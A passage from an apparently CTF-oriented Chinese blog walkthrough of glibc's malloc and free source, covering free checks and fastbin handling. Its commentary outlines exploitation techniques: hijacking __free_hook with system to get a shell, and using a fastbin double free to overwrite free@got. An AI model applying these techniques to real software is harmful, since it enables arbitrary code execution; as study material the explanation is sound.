bin</code>，因为现在可能已经有合适的<code>chunk</code>了对吧。</p><p>然后如果还是没有合适的呢？就会进入这里的<code>else</code>，调用<code>sysmalloc</code>去分配内存，一次还是分配<code>0x21000</code>的<code>chunk</code>作为新的<code>top_chunk</code>，原来的<code>top_chunk</code>将会被<code>free</code>，一般来说如果你没有改过<code>top_chunk</code>的<code>size</code>，那么新的和旧的<code>top_chunk</code>将会是物理相邻，如果<code>free</code> 的<code>top_chunk</code>不在<code>fast bin</code>范围内，那就会和新的<code>top_chunk</code>发生合并。那么这一整个<code>malloc</code>源码就解读完了，我们来做一下总结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>检查是否设置了<code>malloc_hook</code>，若设置了则跳转进入<code>malloc_hook</code>，若未设置则获取当前的分配区，进入<code>int_malloc</code>函数。</p></li><li><p>如果当前的分配区为空，则调用<code>sysmalloc</code>分配空间，返回指向新<code>chunk</code>的指针，否则进入下一步。</p></li><li><p>若用户申请的大小在<code>fast bin</code>的范围内，则考虑寻找对应<code>size</code>的<code>fast bin chunk</code>，判断该<code>size</code>的<code>fast bin</code>是否为空，不为空则取出第一个<code>chunk</code>返回，否则进入下一步。</p></li><li><p>如果用户申请的大小符合<code>small bin</code>的范围，则在相应大小的链表中寻找<code>chunk</code>，若<code>small bin</code>未初始化，则调用<code>malloc_consolidate</code>初始化分配器，然后继续下面的步骤，否则寻找对应的<code>small bin</code>的链表，如果该<code>size</code> 的<code>small bin</code>不为空则取出返回，否则继续下面的步骤。如果申请的不在<code>small bin</code>的范围那么调用<code>malloc_consolidate</code>去合并所有<code>fast bin</code>并继续下面的步骤。</p></li><li><p>用户申请的大小符合<code>large bin</code>或<code>small bin</code>链表为空，开始处理<code>unsorted bin</code>链表中的<code>chunk</code>。在<code>unsorted bin</code>链表中查找符合大小的<code>chunk</code>，若用户申请的大小为<code>small bin</code>，<code>unsorted bin</code>中只有一块chunk并指向<code>last_remainder</code>，且<code>chunk size</code>的大小大于<code>size+MINSIZE</code>，则对当前的<code>chunk</code>进行分割，更新分配器中的<code>last_remainder</code>，切出的<code>chunk</code>返回给用户，剩余的<code>chunk</code>回<code>unsorted bin</code>。否则进入下一步。</p></li><li><p>将当前的<code>unsorted bin</code>中的<code>chunk</code>取下，若其<code>size</code>恰好为用户申请的<code>size</code>，则将<code>chunk</code>返回给用户。否则进入下一步</p></li><li><p>获取当前<code>chunk size</code>所对应的bins数组中的头指针。（<code>large bin</code>需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于<code>MAX_ITERS</code>则不在处理。进入下一步。</p></li><li><p>如果用户申请的空间的大小符合<code>large bin</code>的范围或者对应的small bin链表为空且<code>unsorted bin</code>链表中没有符合大小的<code>chunk</code>，则在对应的<code>large bin</code>链表中查找符合条件的<code>chunk</code>（即其大小要大于用户申请的<code>size</code>）。若找到相应的<code>chunk</code>则对<code>chunk</code>进行拆分，返回符合要求的<code>chunk</code>（无法拆分时整块返回）。否则进入下一步。</p></li><li><p>根据<code>binmap</code>找到表示更大<code>size</code>的<code>large bin</code>链表，若其中存在空闲的<code>chunk</code>，则将<code>chunk</code>拆分之后返回符合要求的部分，并更新<code>last_remainder</code>。否则进入下一步。</p></li><li><p>若<code>top_chunk</code>的大小大于用户申请的空间的大小，则将<code>top_chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code>，否则进入下一步。</p></li><li><p>若<code>fast bin</code>不为空，则调用<code>malloc_consolidate</code>合并<code>fast bin</code>，重新回到第四步再次从<code>small bin</code>搜索。否则进入下一步。</p></li><li><p>调用<code>sysmalloc</code>分配空间，<code>free top chunk</code>返回指向新<code>chunk</code>的指针。</p></li><li><p>若<code>_int_malloc</code>函数返回的<code>chunk</code>指针为空，且当前分配区指针不为空，则再次尝试<code>_int_malloc</code></p></li><li><p>对<code>chunk</code>指针进行检查，主要检查<code>chunk</code>是否为<code>mmap</code>，且位于当前的分配区内。</p><h2 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h2></li></ol><p>那我们现在开始解读一下<code>free</code>的源码</p><h3 id="libc-free源码分析"><a href="#libc-free源码分析" class="headerlink" title="__libc_free源码分析"></a>__libc_free源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>函数也是直接调用这里的<code>__libc_free</code>函数完成<code>chunk</code>的释放的操作的。</p><p>跟<code>malloc</code>一样，先读取<code>__free_hook</code>看看是否为空，如果为空则直接由<code>free_hook</code>指向的函数代为执行<code>free</code>，这里也是我们经常劫持的钩子函数，而且<code>free_hook</code>劫持起来比<code>malloc_hook</code>困难。但是一旦劫持成功也会很方便，就是说<code>malloc</code>_hook函数我只能写<code>one_gadget</code>，而一旦条件苛刻那么就还得调栈啊之类的一些操作。劫持到了<code>free_hook</code>我们就直接写<code>system</code>函数，然后<code>free</code>一个内容为<code>/bin/sh</code>的堆块就能稳定<code>get shell</code>。</p><p>然后执行<code>free(NULL)</code>无任何效果，直接返回。</p><p>将传入的指针转换为<code>chunk</code>的指针，因为用户得到的指针其实是<code>&amp;chunk-&gt;fd</code>，这里改为<code>chunk</code>的指针。然后这里需要寻找这个堆块的分配器，看看这个堆块是从哪里分配出来的。之后就是调用<code>_int_free</code>函数去真正释放chunk</p><h3 id="int-free源码分析"><a href="#int-free源码分析" class="headerlink" title="_int_free源码分析"></a>_int_free源码分析</h3><p>同样我们分成几段来讲解，总源码也不直接给了。</p><h4 id="第一段：free前的各种check"><a href="#第一段：free前的各种check" class="headerlink" title="第一段：free前的各种check"></a>第一段：free前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line">INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>首先变量定义是差不多的，然后这里进行了一项<code>check</code>。</p><ol><li><code>(uintptr_t) p &gt; (uintptr_t) -size</code>：这里让我有点费解，指针和size进行比较。通常情况下size取负之后会变得很大，比如<code>0xfff...</code>这样的大数值通常指针不会指向这样的地址，f开头的一般都是内核地址。所以<code>p&gt;0xfff....</code>主要是应该要检测被<code>free</code>的<code>chunk</code>的<code>size</code>不要过大。</li><li><code>misaligned_chunk (p)</code>：这里的话主要是这个<code>chunk</code>的指针与上掩码，掩码就是<code>0x10-1</code>也就是<code>0xf</code>，取出后四位观察是否为0，如果不为0则说明指针错误了，机会在这里报错。这里主要是检查对齐，指针需要指到<code>0x10</code>的整倍数的<code>chunk</code>才能被正常<code>free</code>，就是不知道<code>malloc</code>为什么不开这个检测，开了又有一大批利用手段用不了了(狗头。</li></ol><p><code>check</code>不通过就会用<code>malloc_printerr</code>打印错误信息，然后处理锁上的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>又有一个<code>check</code></p><ol><li><code>size &lt; MINSIZE</code>：如果<code>size</code>还比<code>MINSIZE</code>要小，那肯定<code>size</code>肯定出错了。</li><li><code>!aligned_OK (size)</code>：<code>chunk size</code>也要对齐，但是这个<code>check</code>一般不会被触发，因为再取出<code>chunk size</code>的时候就会把最低位与掉。</li></ol><p>然后它这里需要<code>check</code>一下这个<code>free</code>的<code>chunk</code>是正在使用的，怎么<code>check</code>呢，那就肯定是下一个<code>chunk</code>的<code>prev_inuse</code>位为0啦，具体的实现函数是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));</span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);</span><br><span class="line">      do_check_free_chunk (av, prv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));</span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))</span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多的也不说了，相信都能理解的，根据自身指针和自身大小就可以很容易知道下一个<code>chunk</code>的位置，然后检测一下<code>prev_inuse</code>位判断我当前<code>chunk</code>是否被使用。</p><h3 id="fast-bin范围的处理"><a href="#fast-bin范围的处理" class="headerlink" title="fast bin范围的处理"></a>fast bin范围的处理</h3><h4 id="fast-bin的check"><a href="#fast-bin的check" class="headerlink" title="fast bin的check"></a>fast bin的check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">    &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! have_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个大条件很明显就是判断这个<code>free</code>的<code>chunk</code>是否为<code>fast bin</code>，后面又判断且这个<code>chunk</code>的后一个<code>chunk</code>不为<code>top_chunk</code>，虽然根据自己的经验好像判断后一个不为<code>top_chunk</code>没什么意义。</p><p>然后满足的话就是一个<code>check</code>，判断<code>size</code>是否小于<code>MINSIZE</code>或者是<code>size&gt;=system_mem</code>。就是排除一些不合理的情况然后会重新尝试拿分配器的锁然后再做一个判断，如果刚刚那个条件还是成立的话那就说明<code>size</code>真的被改成了非法数值，那就报错退出。</p><p>如果进来了但是没有执行报错呢，说明可能多线程有点问题，就释放这个<code>arena</code>的锁，这里我多线程不是很好也不知道该如何解释，但是这个应该不是主要分析的，咱们平时做题基本也不会遇到多线程编程的题目。</p><h4 id="free-fast-bin"><a href="#free-fast-bin" class="headerlink" title="free fast bin"></a>free fast bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">        (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">        size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">        only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它先执行了一个<code>free_perturb</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free_perturb</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实跟前面<code>malloc</code>那个函数差不多，就是看你有没有设置那个值，如果设置了就在<code>free</code>之前把堆块进行<code>memset</code>清空，但是不一样的是，<code>perturb</code>中<code>memset</code>第二个参数是要根据你设置的值再异或一个<code>0xff</code>的。</p><p>然后是用<code>set_fastchunks(av)</code>宏定义去初始化<code>fast bin</code>。之后根据<code>size</code>算出下标找到对应的<code>fast bin</code>，之后就应该把这个<code>free</code>的<code>chunk</code>链入<code>fast bin</code>里面。这里还有一个<code>check</code>，如果<code>bin</code>顶部的那个<code>chunk</code>和这次要<code>free</code>的<code>chunk</code>相等的话，就报错退出，这也就是我们熟知的<code>double free</code>漏洞了。那么说到<code>double free</code>我们来看看<code>double free</code>能造成什么后果。</p><p>假如我要<code>free</code>的<code>chunk</code>是A，我第一次<code>free</code> A，<code>bin</code>为空，链入其中，<code>fast bin</code>中多了一个A。第二次<code>free</code> A，A再次被加入<code>fast bin</code>中，然后会导致产生一个自己指向自己的指针。<code>fast bin</code>中的情况就是两个A，<code>A-&gt;A</code>。此时我申请一个和A一样大的<code>chunk</code>，A被申请走，<code>fast bin</code>中还剩下一个A，但是此时用户手里有一个A，<code>fast bin</code>中也有一个A。用户可以直接编辑A的指针域，比如我让它指向了<code>got</code>表中的<code>free</code>函数。那么此时<code>fast bin</code>中的情况就是<code>A-&gt;free@got</code>。然后我再次申请和A一样大小的<code>chunk</code>，A被取出来，<code>fast bin</code>中剩下<code>free@got</code>。那么我第三次申请就得到了在<code>free@got</code>那边的<code>chunk</code>，然后假如我偷偷修改一下<code>free@got</code>为<code>system</code>，那就能轻松<code>get 